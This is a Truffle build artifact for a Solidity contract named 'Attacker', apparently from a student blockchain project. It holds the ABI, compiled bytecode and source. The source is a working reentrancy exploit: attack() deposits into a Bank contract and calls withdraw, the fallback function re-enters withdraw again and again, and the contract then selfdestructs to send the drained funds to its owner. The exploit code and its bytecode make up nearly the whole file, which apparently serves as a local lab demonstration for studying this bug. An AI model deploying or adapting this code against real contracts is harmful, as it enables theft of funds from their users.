{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "name": "_bank_address",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getBankAddress",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getTotalBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000805534801561001457600080fd5b5060405160208061047e8339810180604052602081101561003457600080fd5b810190808051906020019092919050505080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610366806101186000396000f3fe60806040526004361061003f5760003560e01c806312065fe0146100d057806312b58349146100fb57806366f780e9146101265780639e5faafc1461017d575b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000546040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156100b657600080fd5b505af11580156100ca573d6000803e3d6000fd5b50505050005b3480156100dc57600080fd5b506100e5610187565b6040518082815260200191505060405180910390f35b34801561010757600080fd5b50610110610190565b6040518082815260200191505060405180910390f35b34801561013257600080fd5b5061013b6101af565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101856101d9565b005b60008054905090565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60003411156103385734600081905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db06000546040518263ffffffff1660e01b81526004016000604051808303818588803b15801561025557600080fd5b505af1158015610269573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000546040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156102e557600080fd5b505af11580156102f9573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b56fea165627a7a723058209c66b0e9b3417777cc11b031993cba8e5d659c064e60a602820b20258132567b0029",
  "source": "pragma solidity ^0.5.8;\n\nimport \"./Bank.sol\";\n\ncontract Attacker {\n\tuint balance = 0;\n\tBank bank;\n\taddress bank_address;\n\taddress payable owner;\n\n\tconstructor(address _bank_address) public {\n\t   bank = Bank(_bank_address);\n\t   bank_address = _bank_address;\n\t   owner = msg.sender;\n\t}\n\n\tfunction getBalance() public view returns(uint) {\n\t\treturn balance;\n\t}\n\n\tfunction getBankAddress() public view returns(address) {\n\t\treturn bank_address;\n\t}\n\n\tfunction attack() public payable {\n\t    // there has to be some balance to start with\n\t    if (msg.value > 0) {\n    \t    balance = msg.value;\n    \t    bank.deposit.value(balance)();\n    \t    // the following line will not terminate until\n    \t    // all the fallback function calls have finished\n    \t\tbank.withdraw(balance);\n    \t\t// sending funds to the owner and selfdestruct \n    \t\t// after the attack\n    \t\tselfdestruct(owner);\n\t    }\n\t}\n\t\n\tfunction getTotalBalance() public view returns (uint) {\n\t    return address(this).balance;\n\t}\n\n\tfunction () external payable { // fallback function\n\t   bank.withdraw(balance);\n\t}\n}",
  "sourcePath": "/Users/Trouser/Desktop/projects/fyp/local_blkchain/truffle/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.8+commit.23d335f2.Emscripten.clang"
  },
  "schemaVersion": "3.0.13",
  "updatedAt": "2019-09-03T11:37:31.744Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}